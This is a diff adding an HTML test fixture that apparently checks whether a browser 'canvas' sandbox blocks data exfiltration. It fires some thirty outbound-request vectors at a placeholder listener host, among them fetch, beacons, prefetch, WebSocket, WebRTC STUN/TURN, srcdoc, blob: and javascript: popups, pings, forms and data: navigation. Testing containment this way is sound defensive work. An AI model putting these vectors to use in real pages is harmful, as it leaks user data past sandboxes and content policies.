@@ -1,0 +1,276 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Canvas Exfil Fixture</title>
+  <!-- Every vector has a name; the e2e counts listener hits per name (B2 ORTA-2b).
+       HTTP vectors: path /<name> on __HOST__:__HTTP_PORT__. preconnect: own TCP ports.
+       WebRTC: own UDP ports. dns_prefetch*: no local listener can see a DNS lookup. -->
+  <link rel="prefetch" href="http://__HOST__:__HTTP_PORT__/prefetch_static">
+  <link rel="preconnect" href="http://__HOST__:__PCS_PORT__/">
+  <link rel="dns-prefetch" href="//cdpilot-dns-prefetch-static.invalid">
+  <!-- B3 O-1: speculation rules leave from the browser process (no renderer request). -->
+  <script type="speculationrules">
+    {"prefetch": [{"source": "list", "urls": ["http://__HOST__:__HTTP_PORT__/specrules"]}],
+     "prerender": [{"source": "list", "urls": ["http://__HOST__:__HTTP_PORT__/specrules_prerender"]}]}
+  </script>
+</head>
+<body>
+  <div id="status">running</div>
+  <script>
+    (function () {
+      var host = '__HOST__';
+      var hp = '__HTTP_PORT__';
+      var base = 'http://' + host + ':' + hp;
+      var r = (window.__r = {});
+      // Page-side result per vector; inside the canvas it also goes out as a page event
+      // (type input, action exfil, id <vector>) so the e2e can say what stopped each one.
+      function rep(name, v) {
+        r[name] = v;
+        try {
+          if (typeof window.__cdpilotCanvasEmit === 'function') {
+            window.__cdpilotCanvasEmit(JSON.stringify({
+              type: 'input', action: 'exfil', id: name, data: String(v).slice(0, 200)
+            }));
+          }
+        } catch (e) {}
+      }
+      try {
+        document.addEventListener('securitypolicyviolation', function (e) {
+          rep('csp:' + e.effectiveDirective, String(e.blockedURI).slice(0, 120));
+        });
+      } catch (e) {}
+      try {
+        window.addEventListener('message', function (e) {
+          var m = String(e.data || '');
+          var i = m.indexOf('|');
+          if (i > 0 && /^(webrtc_srcdoc|srcdoc_popup)/.test(m)) rep(m.slice(0, i), m.slice(i + 1));
+        });
+      } catch (e) {}
+
+      // B3 D-4: a derived document (blob:, javascript:, about:srcdoc) with one full-page
+      // button. The e2e clicks it with Input.dispatchMouseEvent (real user activation); the
+      // button calls window.open toward the listener. The result goes out as a page event.
+      var mode = typeof window.__EXFIL_MODE__ === 'string' ? window.__EXFIL_MODE__ : 'main';
+      if (mode === 'srcdoc_popup') {
+        try {
+          var pf = document.createElement('iframe');
+          pf.style.cssText = 'position:fixed;left:0;top:0;width:100vw;height:100vh;border:0';
+          pf.srcdoc = '<!doctype html><body style="margin:0"><button id="b" ' +
+            'style="position:fixed;left:0;top:0;width:100vw;height:100vh">open</button><scr' + 'ipt>' +
+            'document.getElementById("b").onclick=function(){var w=null;try{w=window.open(' +
+            JSON.stringify(base + '/srcdoc_popup') + ');}catch(e){}' +
+            'parent.postMessage("srcdoc_popup|"+(w===null?"null":"opened"),"*");};</scr' + 'ipt></body>';
+          document.body.appendChild(pf);
+          rep(mode, 'derived');
+        } catch (e) { rep(mode, 'err:' + e); }
+        return;
+      }
+      if (mode === 'blob_popup' || mode === 'jsurl_popup') {
+        var target = base + '/' + mode;
+        var report = 'try{if(typeof window.__cdpilotCanvasEmit==="function")window.__cdpilotCanvasEmit(' +
+          'JSON.stringify({type:"input",action:"exfil",id:"' + mode + '",data:String(w===null?"null":"opened")}))}catch(e){}';
+        var btn = '<button id="b" style="position:fixed;left:0;top:0;width:100vw;height:100vh">open</button>';
+        var handler = 'document.getElementById("b").onclick=function(){var w=null;try{w=window.open(' +
+          JSON.stringify(target) + ');}catch(e){}' + report + '};';
+        setTimeout(function () {
+          try {
+            if (mode === 'blob_popup') {
+              var bh = '<!doctype html><html><body>' + btn + '<scr' + 'ipt>' + handler + '</scr' + 'ipt></body></html>';
+              location.href = URL.createObjectURL(new Blob([bh], { type: 'text/html' }));
+            } else {
+              var jh = '<!doctype html><html><body>' + btn + '<scr' + 'ipt>' + handler + '</scr' + 'ipt></body></html>';
+              location.href = 'javascript:' + encodeURIComponent(JSON.stringify(jh));
+            }
+            rep(mode, 'derived');
+          } catch (e) { rep(mode, 'err:' + e); }
+        }, 50);
+        return;
+      }
+
+      // fetch
+      try {
+        fetch(base + '/fetch', { mode: 'no-cors' }).then(
+          function () { rep('fetch', 'ok'); },
+          function (e) { rep('fetch', 'blocked:' + e); }
+        );
+      } catch (e) { rep('fetch', 'err:' + e); }
+
+      // img beacon
+      try {
+        var img = new Image();
+        img.onload = function () { rep('img', 'ok'); };
+        img.onerror = function () { rep('img', 'error'); };
+        img.src = base + '/img';
+      } catch (e) { rep('img', 'err:' + e); }
+
+      // external script
+      try {
+        var sc = document.createElement('script');
+        sc.onload = function () { rep('script', 'ok'); };
+        sc.onerror = function () { rep('script', 'error'); };
+        sc.src = base + '/script';
+        document.head.appendChild(sc);
+      } catch (e) { rep('script', 'err:' + e); }
+
+      // dynamic prefetch / preconnect / dns-prefetch
+      try {
+        var lp = document.createElement('link');
+        lp.rel = 'prefetch';
+        lp.href = base + '/prefetch';
+        document.head.appendChild(lp);
+        rep('prefetch', 'appended');
+      } catch (e) { rep('prefetch', 'err:' + e); }
+      try {
+        var lc = document.createElement('link');
+        lc.rel = 'preconnect';
+        lc.href = 'http://' + host + ':__PC_PORT__/';
+        document.head.appendChild(lc);
+        rep('preconnect', 'appended');
+      } catch (e) { rep('preconnect', 'err:' + e); }
+      try {
+        var ld = document.createElement('link');
+        ld.rel = 'dns-prefetch';
+        ld.href = '//cdpilot-dns-prefetch.invalid';
+        document.head.appendChild(ld);
+        rep('dns_prefetch', 'appended');
+      } catch (e) { rep('dns_prefetch', 'err:' + e); }
+
+      // iframe
+      try {
+        var ifr = document.createElement('iframe');
+        ifr.src = base + '/iframe';
+        document.body.appendChild(ifr);
+        rep('iframe', 'appended');
+      } catch (e) { rep('iframe', 'err:' + e); }
+
+      // WebSocket
+      try {
+        var ws = new WebSocket('ws://' + host + ':' + hp + '/ws');
+        ws.onopen = function () { rep('ws', 'open'); ws.close(); };
+        ws.onerror = function () { rep('ws', 'error'); };
+      } catch (e) { rep('ws', 'err:' + e); }
+
+      // WebRTC: CSP and sandbox do not stop it (B2 ORTA-2c); each vector has its own UDP port.
+      function rtc(name, PC, servers) {
+        try {
+          if (typeof PC !== 'function') { rep(name, 'no-constructor:' + typeof PC); return; }
+          var pc = new PC({ iceServers: servers });
+          pc.createDataChannel('exfil');
+          pc.createOffer().then(function (offer) {
+            return pc.setLocalDescription(offer);
+          }).then(function () {
+            rep(name, 'gathering');
+          }).catch(function (e) { rep(name, 'err:' + e); });
+        } catch (e) { rep(name, 'err:' + e); }
+      }
+      try {
+        rtc('webrtc_stun', window.RTCPeerConnection, [{ urls: 'stun:' + host + ':__UDP_STUN__' }]);
+      } catch (e) { rep('webrtc_stun', 'err:' + e); }
+      try {
+        rtc('webrtc_turn', window.RTCPeerConnection, [{
+          urls: 'turn:' + host + ':__UDP_TURN__?transport=udp', username: 'u', credential: 'p'
+        }]);
+      } catch (e) { rep('webrtc_turn', 'err:' + e); }
+      // A fresh about:blank iframe realm has its own RTCPeerConnection.
+      try {
+        var fr = document.createElement('iframe');
+        document.body.appendChild(fr);
+        var IPC = fr.contentWindow.RTCPeerConnection;
+        rtc('webrtc_iframe', IPC, [{ urls: 'stun:' + host + ':__UDP_IFRAME__' }]);
+      } catch (e) { rep('webrtc_iframe', 'err:' + (e && e.name ? e.name : e)); }
+
+      // B3 D-3: srcdoc frames run their own script in their own realm. Three variants:
+      // plain, sandbox="allow-scripts", csp="sandbox allow-scripts"; each has its own UDP port.
+      [['webrtc_srcdoc', '__UDP_SRCDOC__', null, null],
+       ['webrtc_srcdoc_sandbox', '__UDP_SRCDOC_SB__', 'allow-scripts', null],
+       ['webrtc_srcdoc_csp', '__UDP_SRCDOC_CSP__', null, 'sandbox allow-scripts']].forEach(function (v) {
+        try {
+          var name = v[0];
+          var code = 'var n=' + JSON.stringify(name) + ';try{if(typeof RTCPeerConnection!=="function"){' +
+            'parent.postMessage(n+"|no-constructor:"+typeof RTCPeerConnection,"*");}else{' +
+            'var pc=new RTCPeerConnection({iceServers:[{urls:"stun:' + host + ':' + v[1] + '"}]});' +
+            'pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o);})' +
+            '.then(function(){parent.postMessage(n+"|gathering","*");},function(e){parent.postMessage(n+"|err:"+e,"*");});}' +
+            '}catch(e){parent.postMessage(n+"|err:"+e,"*");}';
+          var sf = document.createElement('iframe');
+          if (v[2] !== null) sf.setAttribute('sandbox', v[2]);
+          if (v[3] !== null) sf.setAttribute('csp', v[3]);
+          sf.srcdoc = '<!doctype html><scr' + 'ipt>' + code + '</scr' + 'ipt>';
+          document.body.appendChild(sf);
+          rep(name, 'appended');
+        } catch (e) { rep(v[0], 'err:' + e); }
+      });
+
+      // window.open
+      try {
+        var w = window.open(base + '/window_open');
+        rep('window_open', w === null ? 'null' : 'opened');
+      } catch (e) { rep('window_open', 'err:' + e); }
+
+      // <a ping> on a real hyperlink navigation (a_nav is the navigation itself)
+      setTimeout(function () {
+        try {
+          var a = document.createElement('a');
+          a.href = base + '/a_nav';
+          a.ping = base + '/ping';
+          a.textContent = 'ping';
+          document.body.appendChild(a);
+          a.click();
+          rep('ping', 'clicked');
+        } catch (e) { rep('ping', 'err:' + e); }
+      }, 20);
+
+      // form submit (40ms), location= (120ms), meta refresh (240ms)
+      setTimeout(function () {
+        try {
+          var f = document.createElement('form');
+          f.method = 'GET';
+          f.action = base + '/form';
+          document.body.appendChild(f);
+          f.submit();
+          rep('form', 'submitted');
+        } catch (e) { rep('form', 'err:' + e); }
+      }, 40);
+
+      setTimeout(function () {
+        try {
+          location.href = base + '/location';
+          rep('location', 'assigned');
+        } catch (e) { rep('location', 'err:' + e); }
+      }, 120);
+
+      setTimeout(function () {
+        try {
+          var m = document.createElement('meta');
+          m.httpEquiv = 'refresh';
+          m.content = '0;url=' + base + '/meta_refresh';
+          document.head.appendChild(m);
+          rep('meta_refresh', 'appended');
+        } catch (e) { rep('meta_refresh', 'err:' + e); }
+      }, 240);
+
+      // data: and blob: top-level navigation (the blob page then goes to about:blank after 1.5 s,
+      // so its own fetch is not cancelled by the next navigation on a loaded machine)
+      var blobDelay = typeof window.__EXFIL_BLOB_DELAY__ === 'number' ? window.__EXFIL_BLOB_DELAY__ : 1800;
+      setTimeout(function () {
+        try {
+          location.href = 'data:text/html,<script>fetch("' + base + '/data_nav",{mode:"no-cors"})<\/script>';
+          rep('data_nav', 'attempted');
+        } catch (e) { rep('data_nav', 'err:' + e); }
+        setTimeout(function () {
+          try {
+            var blobHtml = '<!doctype html><html><body><script>' +
+              'try{fetch("' + base + '/blob_nav",{mode:"no-cors"});}catch(e){}' +
+              'setTimeout(function(){try{location.href="about:blank";}catch(e){}},1500);' +
+              '<\/script></body></html>';
+            var blob = new Blob([blobHtml], { type: 'text/html' });
+            location.href = URL.createObjectURL(blob);
+            rep('blob_nav', 'assigned');
+          } catch (e) { rep('blob_nav', 'err:' + e); }
+        }, 20);
+      }, blobDelay);
+    })();
+  </script>
+</body>
+</html>
